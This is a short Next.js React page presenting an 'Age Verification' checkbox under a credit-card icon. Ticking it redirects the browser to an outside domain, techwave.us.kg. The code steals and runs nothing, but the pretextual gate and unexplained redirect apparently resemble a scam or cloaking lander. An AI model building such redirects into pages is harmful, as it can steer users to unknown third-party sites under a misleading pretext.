"use client"

import { useState } from "react"
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome"
import { faCreditCard } from "@fortawesome/free-solid-svg-icons"
import styles from "./page.module.css"

export default function Home() {
  const [isChecked, setIsChecked] = useState(false)

  const handleCheckboxChange = () => {
    setIsChecked(!isChecked)
    if (!isChecked) {
      window.location.href = "https://techwave.us.kg"
    }
  }

  return (
    <main className={styles.main}>
      <div className={styles.logo}>
        <FontAwesomeIcon icon={faCreditCard} className={styles.cardIcon} />
      </div>
      <div className={styles.content}>
        <h1>Age Verification</h1>
        <p>Please confirm your age to continue.</p>
        <label className={styles.checkbox}>
          <input type="checkbox" checked={isChecked} onChange={handleCheckboxChange} />
          <span className={styles.checkmark}></span>
          <span className={styles.checkboxText}>Tap to continue if you're 18+</span>
        </label>
      </div>
      <div className={styles.animation}>
        <div className={styles.circle}></div>
        <div className={styles.circle}></div>
        <div className={styles.circle}></div>
      </div>
    </main>
  )
}

